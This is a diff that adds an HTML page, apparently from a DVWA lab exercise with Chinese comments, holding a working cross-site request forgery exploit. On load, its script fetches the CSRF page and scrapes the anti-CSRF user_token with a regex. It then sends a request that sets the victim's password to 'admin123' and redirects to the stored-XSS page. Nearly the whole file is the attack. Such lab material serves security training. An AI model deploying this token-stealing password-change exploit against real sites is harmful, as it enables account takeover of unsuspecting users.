@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, install-scale=1.0">
+    <!-- 此处是执行脚本，执行完成后已经完成了修改密码的功能 -->
+    <script type="text/javascript">
+        var tokenUrl = 'http://192.168.31.238:8080/DVWA-master/vulnerabilities/csrf/';
+        // 实例化XMLHttpRequest. 用于发送AJAX请求
+        xmlhttp = new XMLHttpRequest();
+        var count = 0;
+        // 当请求状态发生变化时，触发执行代码
+        xmlhttp.onreadystatechange=function(){
+            if(xmlhttp.readyState == 4 && xmlhttp.status==200)
+            {
+                // 取得请求的响应，并从响应中正则提取Token
+                var text = xmlhttp.responseText;
+                var regex = /user_token\' value\=\'(.*?)\' \/\>/;
+                var match = text.match(regex);
+                // alert(match[1]);
+                var token = match[1];
+                // 发送修改密码的语法
+                var changeUrl = 'http://192.168.31.238:8080/DVWA-master/vulnerabilities/csrf/?user_token='+token+'&password_new=admin123&password_conf=admin123&Change=Change';
+                if (count == 0){
+                     count = 1;    // 只发送一次，否则会多次发送
+                     xmlhttp.open("GET",changeUrl,false);
+                     xmlhttp.send();
+                }
+            }
+        };
+        xmlhttp.open("GET",tokenUrl, false);
+        xmlhttp.send();
+    </script>
+    <title>CSRF</title>
+</head>
+<body>
+    <!--此处的代码仅仅只是为了做一个跳转，不是必须的代码-->
+    <script>location.href="http://192.168.31.238:8080/DVWA-master/vulnerabilities/xss_s/";</script>
+</body>
+</html>
